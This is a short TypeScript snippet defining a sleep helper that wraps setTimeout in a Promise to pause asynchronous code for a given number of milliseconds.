function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}

